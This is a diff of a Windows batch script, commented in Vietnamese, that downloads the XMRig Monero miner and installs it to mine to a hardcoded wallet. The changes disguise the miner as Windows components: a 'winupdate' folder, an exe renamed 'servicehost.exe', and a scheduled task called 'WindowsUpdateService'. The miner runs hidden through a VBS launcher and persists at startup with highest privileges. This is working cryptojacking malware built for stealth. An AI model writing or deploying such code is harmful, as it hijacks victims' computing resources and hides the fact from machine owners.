@@ -1,58 +1,67 @@
 @echo off
-title Cài đặt XMRig AutoRun
+title Cai dat AutoRun FIXED
 setlocal
 
-:: ------------------- Cấu hình -------------------
+:: Cau hinh
 set WALLET=47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL
 set RIG=%COMPUTERNAME%
-set INSTALL_DIR=D:\xmrig_autorun
-set XMRIG_URL=https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-gcc-win64.zip
-:: ------------------------------------------------
+set INSTALL_DIR=D:\winupdate
+set FAKE_EXE=servicehost.exe
+set VBS_FILE=winup.vbs
+set TASK_NAME=WindowsUpdateService
+set ZIP_URL=https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-gcc-win64.zip
+set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
-echo [+] Tạo thư mục: %INSTALL_DIR%
-mkdir "%INSTALL_DIR%"
+:: Tao thu muc
+mkdir "%INSTALL_DIR%" 2>nul
 cd /d "%INSTALL_DIR%"
 
-echo [+] Tải XMRig...
-curl -L -o xmrig.zip %XMRIG_URL%
-tar -xf xmrig.zip
+:: Tai va giai nen
+curl -L -o miner.zip %ZIP_URL%
+tar -xf miner.zip
 
-:: Tìm thư mục vừa giải nén (xmrig-xxx)
-for /d %%F in ("xmrig-*") do set XMRIG_DIR=%%F
+:: Doi ten folder va file
+for /d %%F in ("xmrig-*") do (
+    move "%%F" "bin" >nul
+)
+cd bin
+rename xmrig.exe %FAKE_EXE%
 
-echo [+] Tạo start.bat...
+:: Tao start.bat
 (
 echo @echo off
-echo cd /d "%INSTALL_DIR%\%XMRIG_DIR%"
-echo start /min xmrig.exe -o pool.supportxmr.com:3333 -u %WALLET% -k --rig-id %RIG%
+echo cd /d "%INSTALL_DIR%\bin"
+echo start /min %FAKE_EXE% -o pool.supportxmr.com:3333 -u %WALLET% -k --rig-id %RIG%
 ) > "%INSTALL_DIR%\start.bat"
 
-echo [+] Tạo silent.vbs...
+:: Tao VBS chay an
 (
 echo Set WshShell = CreateObject("WScript.Shell"^)
 echo WshShell.Run chr(34^) ^& "%INSTALL_DIR%\start.bat" ^& Chr(34^), 0
 echo Set WshShell = Nothing
-) > "%INSTALL_DIR%\silent.vbs"
+) > "%INSTALL_DIR%\%VBS_FILE%"
 
-echo [+] Tạo copy_to_startup.bat...
+:: Tao file copy_to_startup.bat
 (
 echo @echo off
-echo set VBSFILE=%INSTALL_DIR%\silent.vbs
-echo set SHORTCUT=%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\silent.vbs
-echo copy "%%VBSFILE%%" "%%SHORTCUT%%" /Y
+echo copy "%INSTALL_DIR%\%VBS_FILE%" "%STARTUP_FOLDER%\%VBS_FILE%" /Y
 ) > "%INSTALL_DIR%\copy_to_startup.bat"
 
-echo [+] Copy shortcut silent.vbs vào thư mục Startup...
-copy "%INSTALL_DIR%\silent.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\silent.vbs" /Y
+:: Copy ngay shortcut vao Startup
+copy "%INSTALL_DIR%\%VBS_FILE%" "%STARTUP_FOLDER%\%VBS_FILE%" /Y
 
-echo [+] Tạo Scheduled Task để khôi phục shortcut mỗi khi máy khởi động...
+:: Tao Scheduled Task chay startup
 schtasks /Create ^
- /TN "XMRigStartupRestore" ^
+ /TN "%TASK_NAME%" ^
  /TR "\"%INSTALL_DIR%\copy_to_startup.bat\"" ^
  /SC ONSTART ^
  /RL HIGHEST ^
- /F
+ /F >nul
+
+:: Chay miner lan dau
+echo [+] Dang chay miner lan dau...
+cscript //nologo "%INSTALL_DIR%\%VBS_FILE%"
 
 echo.
-echo [✔] Hoàn tất! Miner sẽ tự chạy ẩn khi máy khởi động, với tên worker là: %COMPUTERNAME%
+echo [OK] Cai dat hoan tat. Miner se tu chay an khi khoi dong.
 pause
